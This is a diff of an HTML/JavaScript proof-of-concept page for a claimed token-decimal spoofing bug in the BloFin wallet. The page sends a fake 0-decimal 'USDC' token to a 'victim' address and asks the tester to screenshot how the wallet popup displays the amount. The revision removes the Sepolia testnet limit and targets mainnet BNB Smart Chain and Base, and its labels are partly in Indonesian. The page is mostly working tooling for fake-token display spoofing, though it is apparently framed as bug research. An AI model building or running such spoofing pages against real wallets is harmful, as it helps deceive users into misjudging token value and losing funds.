@@ -1,93 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>BLOFIN DECIMAL SPOOFING TEST</title>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BLOFIN DECIMAL TEST - BSC & BASE READY</title>
 <style>
-body{font-family:monospace;background:#000;color:#fff;padding:20px}
-h1{color:#ff3b30}
-.card{background:#111;border:1px solid #333;padding:14px;border-radius:12px;margin:12px 0}
-button{width:100%;padding:18px;background:#ff9f0a;color:#000;border:0;border-radius:12px;font-weight:bold;margin:8px 0}
-input{width:100%;padding:12px;background:#1c1c1e;border:1px solid #333;color:#fff;border-radius:8px;margin:6px 0}
-.mono{word-break:break-all;font-size:12px;background:#000;padding:8px;border-radius:6px}
-.log{background:#0f0f0f;border:1px solid #222;padding:12px;border-radius:10px;min-height:100px;font-size:11px}
+body{background:#000;color:#fff;font-family:monospace;padding:16px}
+button{width:100%;padding:16px;border:0;border-radius:12px;font-weight:bold;margin:8px 0}
+.card{background:#111;border:1px solid #333;padding:12px;border-radius:10px;margin:10px 0}
+input{width:100%;padding:12px;background:#1e1e1e;border:1px solid #333;color:#fff;border-radius:8px;margin:6px 0}
+.log{background:#0a0a0a;border:1px solid #222;padding:10px;border-radius:8px;min-height:90px;font-size:11px;word-break:break-all}
 </style>
 </head>
 <body>
-<h1>BLOFIN TEST: TOKEN DECIMAL SPOOFING</h1>
-<div class="card">
-<b>Bug:</b> BloFin displays transfer amount based on symbol, not actual decimals.<br>
-USDC real decimals = 6. FakeUSDC decimals = 0.<br>
-1000 units FakeUSDC = should display 1000 (because decimals 0).<br>
-But if BloFin reads it as USDC real, it will display 0.001 USDC or 1000 USDC incorrectly.
-</div>
+<h2 style="color:#ff9f0a">BLOFIN - DECIMAL SPOOFING PoC</h2>
+<div class="card">Bug: Symbol USDC dibaca, tapi decimals() tidak. Work di BNB Smart Chain / Base / Ethereum yang ada di app kamu.</div>
 
-<button id="connect">1. CONNECT WALLET (Set to Sepolia)</button>
+<button id="connect" style="background:#0a84ff;color:#fff">1. CONNECT WALLET</button>
 <div id="status" class="card">Not connected</div>
 
-<div class="card">
-<label>Paste FakeUSDC Address (decimal 0) from Remix:</label>
-<input id="fakeAddr" placeholder="0xYourFakeUSDCAddress...">
-<label>Victim Address (to send to):</label>
-<input id="victimAddr" placeholder="0xVictim... (can be your other wallet)">
-<button id="testFake">2. TEST TRANSFER 1000 FakeUSDC (decimal 0)</button>
-</div>
-
-<div class="card">
-<label>Real USDC Sepolia for comparison (decimals 6):</label>
-<input id="realAddr" value="0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238" readonly>
-<div class="mono">USDC Sepolia real: 0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238 (6 decimals)</div>
-<button id="testReal">3. TEST TRANSFER 1000 Real USDC (6 decimals) - Compare display</button>
-</div>
+<input id="fakeAddr" placeholder="Paste alamat FakeUSDC (decimals 0) dari Remix">
+<input id="victimAddr" placeholder="Alamat victim (boleh alamat wallet keduamu)">
+<button id="btnTransfer" style="background:#ff9f0a;color:#000">2. TRANSFER 1000 FakeUSDC (decimals 0) - LIHAT POPUP BLOFIN</button>
+<button id="btnCompare" style="background:#30d158;color:#000">3. TRANSFER 1000 USDC Asli BSC untuk perbandingan</button>
 
 <div id="log" class="log">Logs...</div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
-let provider, signer, userAddr;
-const logEl=document.getElementById('log');
-function log(m,c='#fff'){logEl.innerHTML+=`<div style="color:${c}">[${new Date().toLocaleTimeString()}] ${m}</div>`}
+let provider, signer, user;
+const logEl = document.getElementById('log');
+const log = (m,c='#fff') => logEl.innerHTML += `<div style="color:${c}">[${new Date().toLocaleTimeString()}] ${m}</div>`;
 
-document.getElementById('connect').onclick=async()=>{
- try{
-  provider=new ethers.providers.Web3Provider(window.ethereum);
-  await provider.send("eth_requestAccounts",[]);
-  signer=provider.getSigner();
-  userAddr=await signer.getAddress();
-  const net=await provider.getNetwork();
-  document.getElementById('status').innerHTML=`Connected: ${userAddr}<br>Chain: ${net.chainId} (${net.name}) - MUST be 11155111 Sepolia`;
-  log(`Connected ${userAddr} chain ${net.chainId}`, '#30d158');
-  if(net.chainId!==11155111) log(`SWITCH TO SEPOLIA! This test only works on Sepolia`, '#ff3b30');
- }catch(e){log(e.message,'#ff3b30')}
+document.getElementById('connect').onclick = async () => {
+ try {
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  await provider.send("eth_requestAccounts", []);
+  signer = provider.getSigner();
+  user = await signer.getAddress();
+  const net = await provider.getNetwork();
+  document.getElementById('status').innerHTML = `Connected: ${user}<br>ChainID: ${net.chainId} - Pindah ke BNB Smart Chain (56) atau Base (8453) di app BloFin`;
+  log(`Connected ${user} Chain ${net.chainId}`, '#30d158');
+ } catch(e){ log(e.message, '#ff3b30'); }
 };
 
-async function doTransfer(tokenAddr, amountStr, label){
- if(!signer){log('Connect first','#ff9f0a');return;}
- try{
-  const abi=["function transfer(address,uint256) returns(bool)","function decimals() view returns(uint8)","function symbol() view returns(string)"];
-  const c=new ethers.Contract(tokenAddr, abi, signer);
-  const dec=await c.decimals();
-  const sym=await c.symbol();
-  log(`Token ${tokenAddr} -> symbol=${sym} decimals=${dec} (REAL on-chain)`, '#0a84ff');
-  const to=document.getElementById('victimAddr').value || userAddr;
-  log(`Calling ${label}: transfer(${to}, ${amountStr}) with decimals ${dec}`, '#ffcc00');
-  log(`EXPECTED DISPLAY: If decimals=${dec}, amount ${amountStr} should display as ${amountStr} / 10^${dec} = ${ethers.utils.formatUnits(amountStr, dec)} ${sym}`, '#ffcc00');
-  log(`BUG IF: BloFin displays ${amountStr} ${sym} without considering decimals, or displays 1000 USDC while real value is 0.001`, '#ff3b30');
-  const tx=await c.transfer(to, amountStr);
-  log(`TX SENT: ${tx.hash} - CHECK BLOFIN POPUP NOW! Screenshot popup!`, '#30d158');
- }catch(e){log(`Error: ${e.message}`, '#ff3b30')}
+async function doTransfer(tokenAddr, amount){
+ if(!signer){ log('Connect dulu', '#ff9f0a'); return; }
+ if(!tokenAddr){ log('Paste alamat token dulu', '#ff9f0a'); return; }
+ const to = document.getElementById('victimAddr').value || user;
+ try {
+  const abi = ["function transfer(address,uint256) returns(bool)"];
+  const c = new ethers.Contract(tokenAddr, abi, signer);
+  log(`Kirim transfer(${to}, ${amount}) token ${tokenAddr}. CEK POPUP BLOFIN SEKARANG!`, '#ffcc00');
+  log(`Jika decimals token ini 0, harusnya tampil 1000 token. Jika BloFin tampil 0.000001 atau 1000 USDC tanpa cek decimals = BUG`, '#ff3b30');
+  const tx = await c.transfer(to, amount);
+  log(`TX SENT: ${tx.hash} - SCREENSHOT POPUP BLOFIN`, '#30d158');
+ } catch(e){ log('Error: '+e.message, '#ff3b30'); }
 }
 
-document.getElementById('testFake').onclick=()=>{
- const addr=document.getElementById('fakeAddr').value;
- if(!addr) {log('Paste FakeUSDC address first','#ff9f0a');return;}
- doTransfer(addr, "1000", "FakeUSDC decimals 0");
-};
-document.getElementById('testReal').onclick=()=>{
- const addr=document.getElementById('realAddr').value;
- doTransfer(addr, "1000", "Real USDC decimals 6");
-};
+document.getElementById('btnTransfer').onclick = () => doTransfer(document.getElementById('fakeAddr').value, "1000");
+// USDC asli di BSC: 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d (18 decimals)
+document.getElementById('btnCompare').onclick = () => doTransfer("0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "1000");
 </script>
 </body>
 </html>
